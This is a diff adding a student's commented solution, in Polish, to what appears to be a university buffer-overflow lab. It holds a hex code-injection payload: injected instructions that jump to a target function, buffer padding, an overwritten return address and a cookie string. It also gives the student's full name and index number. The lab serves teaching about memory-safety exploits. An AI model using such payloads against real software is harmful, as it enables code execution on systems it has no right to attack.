@@ -1,0 +1,21 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Cezary Świtała, 316746
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+48 89 E7                        /* mov %rsp, %rdi -- przenosimy wskaźnik na
+                                *  umieszczoną za adresem powrotu reprezentację ciągu
+                                *  znaków 
+                                */
+68 0E 1D 40 00                  /* pushq $0x401d0e -- umieszczamy adres touch3 na stosie */
+C3                              /* retq -- ściągamy adres touch3 i skaczemy */
+                           00   /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 09 00   /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 09 00   /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 09 00   /* wypełnienie bufora */
+18 51 66 55 00 00 00 00         /* adres początku stosu, pod który skoczy getbuf */
+36 31 36 38 34 37 36 62 00      /* reprezentacja ciasteczka w ascii */
